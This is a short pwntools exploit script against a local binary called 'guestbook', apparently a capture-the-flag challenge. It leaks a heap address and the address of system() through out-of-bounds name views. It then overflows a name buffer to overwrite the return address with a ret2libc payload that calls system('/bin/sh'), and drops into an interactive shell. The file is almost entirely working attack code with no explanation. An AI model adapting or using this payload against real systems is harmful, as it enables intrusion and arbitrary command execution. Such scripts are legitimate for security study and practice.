from pwn import *

def ch_name(index, name):
    r.recvuntil(">>")
    r.sendline("2")
    r.recvuntil(">>>")
    r.sendline(str(index))
    #r.interactive()
    r.recvuntil(">>>")
    r.sendline(name)

def vw_name(index):
    r.recvuntil(">>")
    r.sendline("1")
    r.recvuntil(">>>")
    r.sendline(str(index))

r = process("./guestbook")

# providing guest names
for i in range(4):
    r.recvuntil(">>>")
    r.sendline(chr(0x41 + i)*4)

# leak stack address
vw_name(6)
leak = r.recv(24)
heap_addr = u32(leak[0:4])
log.info("heap address: 0x{:x}".format(heap_addr))
system_addr = u32(leak[20:24])
log.info("system address: 0x{:x}".format(system_addr))
# overwriting return address
ch_name(0, '/bin/sh\x00' + "A"*92 + p32(0) + p32(0) + p32(heap_addr)*4 + "B"*32 + p32(system_addr) + "JUNK" + p32(heap_addr) + "\n")
#gdb.attach(r)
# triggering shell
r.sendline("3")
r.recvuntil(">>")
r.interactive()
